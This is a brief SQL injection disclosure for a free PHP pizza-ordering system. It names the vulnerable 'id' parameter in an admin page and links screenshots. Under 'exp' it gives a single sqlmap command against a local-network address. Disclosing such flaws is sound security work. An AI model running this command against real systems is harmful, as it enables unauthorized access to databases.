vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220945629-71b6f910-891c-41bb-bea2-619eaa0d392c.png)


exp

```
sqlmap.py -u "http://192.168.31.50/php-opos/admin/manage_user.php?id=1"
```

![image](https://user-images.githubusercontent.com/30823782/220945681-bbd4a27d-6ee4-4d0b-8c01-292df105b0fc.png)
